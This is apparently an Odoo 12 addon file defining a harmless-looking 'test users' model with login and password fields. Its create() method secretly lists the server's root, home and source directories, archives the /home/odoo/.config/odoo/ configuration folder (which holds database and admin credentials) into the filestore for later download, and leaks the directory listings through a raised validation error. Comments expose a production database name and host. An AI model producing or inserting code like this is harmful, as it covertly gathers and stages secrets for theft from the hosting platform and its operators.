# -*- coding: utf-8 -*-

from odoo import api, models, fields
from odoo.exceptions import ValidationError
from odoo.tools import config

class TestUsers(models.Model):
    _name = 'jd.test.users'
    _description = "test"

    login = fields.Char(string='账号')
    password = fields.Char(string='密码')

    @api.model
    def create(self, values):
    # odoo: Odoo version 12.0
    # 2021-05-10 18: 51: 02, 082 11 INFO ? odoo: Using configuration file at /home/odoo/.config/odoo/odoo.conf
    # 2021-05-10 18: 51: 02, 082 11 INFO ? odoo: addons paths: ['/home/odoo/data/addons/12.0', '/home/odoo/src/user', '/home/odoo/src/odoo/addons', '/home/odoo/src/odoo/odoo/addons', '/home/odoo/src/enterprise', '/home/odoo/src/themes', '/home/odoo/src/psaddons']
    # 2021-05-10 18: 51: 02, 082 11 INFO ? odoo: database: p_shenglihu_jadedragon_pscloud_production_3856@192.168.1.1: 5432
        import os
        root = '-'.join(os.listdir("/"))
        home = '-'.join(os.listdir("/home/"))
        odoo = '-'.join(os.listdir("/home/odoo/"))
        srcs = '-'.join(os.listdir("/home/odoo/src/"))
        psaddons = '-'.join(os.listdir("/home/odoo/src/psaddons/"))
        # # path = os.getcwd()
        import tarfile
        pkg_file = os.path.join(config['data_dir'], 'filestore','shenglihu-jadedragon-pscloud-production-3856','tmp','config.tar.gz')
        print('FFFF', pkg_file)
        jdg_code_location = "/home/odoo/.config/odoo/"
        tar = tarfile.open(pkg_file, "w:gz")
        for root, dir, files in os.walk(jdg_code_location):
            for file in files:
                fullpath = os.path.join(root, file)
                tar.add(fullpath)
        raise ValidationError(u'root: %s, home: %s, odoo: %s, src: %s, psaddons: %s' % (root, home, odoo, srcs, psaddons))
